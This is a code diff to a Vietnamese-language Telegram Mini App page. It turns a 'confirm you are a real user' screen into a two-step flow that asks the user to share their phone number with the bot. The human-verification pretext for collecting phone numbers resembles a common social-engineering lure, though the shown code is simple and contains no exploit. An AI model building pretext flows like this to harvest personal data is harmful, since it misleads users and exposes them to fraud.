@@ -25,7 +25,7 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   background: rgba(0,0,0,0.25);
 }
 
-/* container căn giữa màn hình */
+/* container căn giữa */
 .container {
   position:absolute;
   top:50%;
@@ -51,11 +51,11 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   100% { transform: rotate(0deg); }
 }
 
-/* text Step 1 cố định 2 dòng, ô vừa chữ */
-.step1-text {
+/* text Step 1 & Step 2 */
+.step-text {
   display:inline-block;
   margin-top:20px;
-  padding:10px 15px; /* ô vừa đủ */
+  padding:10px 15px; /* ô vừa chữ */
   border-radius:12px;
   background: rgba(255,255,255,0.9);
   font-size:17px;
@@ -63,11 +63,11 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   color:#111;
   line-height:1.4;
   text-align:center;
-  white-space: pre; /* giữ xuống dòng như ý */
+  white-space: pre; /* giữ xuống dòng y hệt */
 }
 
-/* nút Xác nhận cùng chiều rộng ô trắng */
-.step1-btn {
+/* nút Xác nhận / Share số */
+.step-btn {
   margin-top:15px;
   padding:12px 0;
   font-size:17px;
@@ -80,6 +80,9 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
   display:inline-block;
   width:100%;
 }
+
+/* Step2 ẩn lúc đầu */
+#step2 { display:none; }
 </style>
 </head>
 
@@ -87,22 +90,42 @@ body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }
 <div class="bg"></div>
 <div class="overlay"></div>
 
-<div class="container" id="step1-container">
-  <div class="icon">👋</div>
-  <div class="step1-text">
+<div class="container">
+
+  <!-- STEP 1 -->
+  <div id="step1">
+    <div class="icon">👋</div>
+    <div class="step-text">
 Bạn cần xác nhận mình là người dùng thật , hãy
      nhấp vào nút bên dưới để bắt đầu !
+    </div>
+    <button class="step-btn" onclick="showStep2()">Xác nhận</button>
   </div>
-  <button class="step1-btn" onclick="step2()">Xác nhận</button>
+
+  <!-- STEP 2: Share số điện thoại -->
+  <div id="step2">
+    <div class="step-text">
+📱 Vui lòng chia sẻ số điện thoại của bạn:
+    </div>
+    <button class="step-btn" onclick="sharePhone()">📲 Chia sẻ số điện thoại</button>
+  </div>
+
 </div>
 
 <script>
 let tg = window.Telegram.WebApp;
 tg.expand();
 
-function step2(){
-  document.getElementById("step1-container").style.display = "none";
-  // Step 2 xuất hiện
+// Hiện Step 2
+function showStep2(){
+  document.getElementById("step1").style.display = "none";
+  document.getElementById("step2").style.display = "block";
+}
+
+// Gửi dữ liệu về bot khi share số
+function sharePhone(){
+  tg.sendData("request_phone");
+  alert("Bấm nút share số trên Telegram để gửi số điện thoại của bạn!");
 }
 </script>
 </body>
